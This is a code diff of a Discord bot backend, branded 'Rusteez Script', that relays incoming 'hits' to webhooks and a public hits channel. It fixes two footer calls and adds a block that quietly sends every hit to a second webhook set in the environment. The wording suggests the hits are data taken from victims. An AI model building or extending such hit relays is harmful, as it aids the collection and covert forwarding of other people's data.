@@ -550,7 +550,13 @@ wss.on('connection', (ws, req) => {
                             embeds: [hitEmbed] 
                         });
                     } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
-        
+                    try {
+                        const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
+                        await webhookClient.send({ 
+                            content: hitInfo.Name,
+                            embeds: [hitEmbed] 
+                        });
+                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
                     // 5. Envoi sur le Channel PUBLIC (public-hits)
                     const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
                     if (publicChannel) {
@@ -717,7 +723,7 @@ async function sendTutorial() {
                     value: "Make sure your DMs are open! If you don't receive the script, check your privacy settings." 
                 }
             )
-            .setFooter({ text: "Rusteez Script Tutorial", iconURL: client.user.displayAvatarURL() })
+            .setFooter({ text: "Rusteez Script Tutorial", iconURL: clientDiscord.user.displayAvatarURL() })
             .setTimestamp();
 
         await channel.send({ embeds: [tutorialEmbed] });
@@ -767,7 +773,7 @@ async function sendOfficialRules() {
                        "*Don't be slow — Stay active.*"
             }
         )
-        .setFooter({ text: "Rusteez Script • Stay Safe", iconURL: client.user.displayAvatarURL() })
+        .setFooter({ text: "Rusteez Script • Stay Safe", iconURL: clientDiscord.user.displayAvatarURL() })
         .setTimestamp();
 
     const message = await channel.send({ embeds: [rulesEmbed] });
